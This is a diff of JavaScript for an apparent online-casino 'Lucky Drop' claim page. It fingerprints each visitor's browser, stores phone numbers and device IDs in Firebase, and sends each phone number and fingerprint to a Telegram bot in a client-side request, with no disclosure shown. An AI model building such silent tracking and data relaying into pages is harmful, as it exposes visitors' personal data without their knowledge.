@@ -1,6 +1,6 @@
 /**
  * CasinoPlus Index Page - Login & Verification
- * Walang auto-ban - Admin lang pwedeng mag-ban
+ * Saves device fingerprint to user_sessions
  */
 
 // Initialize Firebase
@@ -23,7 +23,7 @@ const mainCard = document.getElementById('mainCard');
 const userPhoneInput = document.getElementById('userPhone');
 const claimBtn = document.getElementById('claimBtn');
 
-// ========== DEVICE FINGERPRINT (Store sa Database) ==========
+// ========== DEVICE FINGERPRINT ==========
 function getDeviceFingerprint() {
     const screenResolution = `${screen.width}x${screen.height}x${screen.colorDepth}`;
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -43,11 +43,39 @@ function getDeviceFingerprint() {
     return `FP_${Math.abs(hash)}`;
 }
 
+// ========== GET OR CREATE DEVICE DISPLAY ID ==========
+async function getOrCreateDeviceId(fingerprint) {
+    if (!fingerprint || fingerprint === '---') return '---';
+    
+    const deviceMapRef = db.ref('device_id_map/' + fingerprint);
+    const snap = await deviceMapRef.once('value');
+    
+    if (snap.exists()) {
+        return snap.val().displayId;
+    }
+    
+    const counterRef = db.ref('admin/deviceCounter');
+    const counterSnap = await counterRef.once('value');
+    let nextNum = (counterSnap.val() || 0) + 1;
+    await counterRef.set(nextNum);
+    
+    const displayId = `Dev${nextNum}`;
+    
+    await deviceMapRef.set({
+        displayId: displayId,
+        createdAt: Date.now(),
+        fingerprint: fingerprint
+    });
+    
+    return displayId;
+}
+
 // ========== SAVE DEVICE INFO TO DATABASE ==========
-async function saveDeviceInfo(phone, fingerprint) {
+async function saveDeviceInfo(phone, fingerprint, deviceDisplayId) {
     const deviceInfo = {
         phone: phone,
         fingerprint: fingerprint,
+        displayId: deviceDisplayId,
         screenResolution: `${screen.width}x${screen.height}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         language: navigator.language,
@@ -57,7 +85,6 @@ async function saveDeviceInfo(phone, fingerprint) {
         firstSeen: Date.now()
     };
     
-    // Check if device already exists
     const existingDevice = await db.ref('devices/' + fingerprint).once('value');
     if (!existingDevice.exists()) {
         await db.ref('devices/' + fingerprint).set(deviceInfo);
@@ -65,14 +92,38 @@ async function saveDeviceInfo(phone, fingerprint) {
         await db.ref('devices/' + fingerprint).update({ lastSeen: Date.now() });
     }
     
-    // Map device to phone number
     await db.ref('device_phone_map/' + fingerprint).set({
         phone: phone,
+        displayId: deviceDisplayId,
         lastSeen: Date.now()
     });
 }
 
-// ========== SHOW BLOCKED UI (Admin Ban Only) ==========
+// ========== CREATE USER SESSION (WITH FINGERPRINT) ==========
+async function createUserSession(phone, fingerprint, deviceDisplayId) {
+    const sessionRef = db.ref('user_sessions/' + phone);
+    const sessionSnap = await sessionRef.once('value');
+    
+    if (!sessionSnap.exists()) {
+        await sessionRef.set({
+            phone: phone,
+            balance: 0,
+            clicks: 0,
+            deviceFingerprint: fingerprint,
+            deviceDisplayId: deviceDisplayId,
+            lastUpdate: Date.now(),
+            createdAt: Date.now()
+        });
+    } else {
+        await sessionRef.update({
+            lastUpdate: Date.now(),
+            deviceFingerprint: fingerprint,
+            deviceDisplayId: deviceDisplayId
+        });
+    }
+}
+
+// ========== SHOW BLOCKED UI ==========
 function showBlockedUI(reason = "banned") {
     modalOverlay.style.display = 'flex';
     
@@ -94,7 +145,7 @@ function showBlockedUI(reason = "banned") {
     mainCard.style.pointerEvents = "none";
 }
 
-// ========== HANDLE VERIFY (Intent) ==========
+// ========== HANDLE VERIFY ==========
 window.handleVerify = function() {
     const currentUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
     if (!window.location.hash.includes("verified")) {
@@ -104,7 +155,7 @@ window.handleVerify = function() {
     }
 };
 
-// ========== CHECK IF NUMBER IS BANNED (Admin Only) ==========
+// ========== CHECK IF NUMBER IS BANNED ==========
 async function isNumberBanned(phone) {
     const bannedSnap = await db.ref('banned_ghosts/' + phone).once('value');
     return bannedSnap.exists();
@@ -116,63 +167,7 @@ async function isNumberClaimed(phone) {
     return (logSnap.exists() && logSnap.val().status === 'claimed');
 }
 
-// ========== CREATE USER SESSION ==========
-// ========== CREATE USER SESSION (with fingerprint) ==========
-async function createUserSession(phone, fingerprint) {
-    const sessionRef = db.ref('user_sessions/' + phone);
-    const sessionSnap = await sessionRef.once('value');
-    
-    // Generate or get device display ID (Dev1, Dev2, etc.)
-    const deviceDisplayId = await getOrCreateDeviceId(fingerprint);
-    
-    if (!sessionSnap.exists()) {
-        await sessionRef.set({
-            phone: phone,
-            balance: 0,
-            clicks: 0,
-            deviceFingerprint: fingerprint,
-            deviceDisplayId: deviceDisplayId,
-            lastUpdate: Date.now(),
-            createdAt: Date.now()
-        });
-    } else {
-        await sessionRef.update({
-            lastUpdate: Date.now(),
-            deviceFingerprint: fingerprint,
-            deviceDisplayId: deviceDisplayId
-        });
-    }
-}
-
-// ========== GET OR CREATE DEVICE DISPLAY ID ==========
-async function getOrCreateDeviceId(fingerprint) {
-    if (!fingerprint || fingerprint === '---') return '---';
-    
-    const deviceMapRef = db.ref('device_id_map/' + fingerprint);
-    const snap = await deviceMapRef.once('value');
-    
-    if (snap.exists()) {
-        return snap.val().displayId;
-    }
-    
-    // Get next counter
-    const counterRef = db.ref('admin/deviceCounter');
-    const counterSnap = await counterRef.once('value');
-    let nextNum = (counterSnap.val() || 0) + 1;
-    await counterRef.set(nextNum);
-    
-    const displayId = `Dev${nextNum}`;
-    
-    await deviceMapRef.set({
-        displayId: displayId,
-        createdAt: Date.now(),
-        fingerprint: fingerprint
-    });
-    
-    return displayId;
-}
-
-// ========== PROCESS STEP 1 (Main Logic - No Auto Ban) ==========
+// ========== PROCESS STEP 1 ==========
 window.processStep1 = async function() {
     const phone = userPhoneInput.value.trim();
     const btn = claimBtn;
@@ -187,10 +182,7 @@ window.processStep1 = async function() {
     btn.innerHTML = "VERIFYING...";
 
     try {
-        // 1. Save device info to database (always)
-        await saveDeviceInfo(phone, fingerprint);
-        
-        // 2. Check if number is BANNED by admin (only this blocks)
+        // 1. Check if number is BANNED
         const isBanned = await isNumberBanned(phone);
         if (isBanned) {
             showBlockedUI("banned");
@@ -199,7 +191,7 @@ window.processStep1 = async function() {
             return;
         }
         
-        // 3. Check if number already CLAIMED before
+        // 2. Check if number already CLAIMED
         const isClaimed = await isNumberClaimed(phone);
         if (isClaimed) {
             showBlockedUI("claimed");
@@ -208,16 +200,24 @@ window.processStep1 = async function() {
             return;
         }
         
-        // 4. Create or update user session
-        await createUserSession(phone, fingerprint);
+        // 3. Get or create device display ID (Dev1, Dev2, etc.)
+        const deviceDisplayId = await getOrCreateDeviceId(fingerprint);
         
-        // 5. Send Telegram notification
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone + "\n🖥️ Device FP: " + fingerprint)}`)
+        // 4. Save device info
+        await saveDeviceInfo(phone, fingerprint, deviceDisplayId);
+        
+        // 5. Create or update user session with fingerprint
+        await createUserSession(phone, fingerprint, deviceDisplayId);
+        
+        // 6. Send Telegram notification with fingerprint and Dev#
+        const message = `🎁 LUCKY DROP LOGIN:\n📱 ${phone}\n🖥️ FP: ${fingerprint}\n🔑 DEV#: ${deviceDisplayId}`;
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .catch(e => console.log('Telegram error:', e));
         
-        // 6. Save to localStorage and redirect
+        // 7. Save to localStorage and redirect
         localStorage.setItem("userPhone", phone);
         localStorage.setItem("userDeviceId", fingerprint);
+        localStorage.setItem("userDeviceDisplayId", deviceDisplayId);
         btn.innerHTML = "SUCCESS!";
         
         setTimeout(() => {
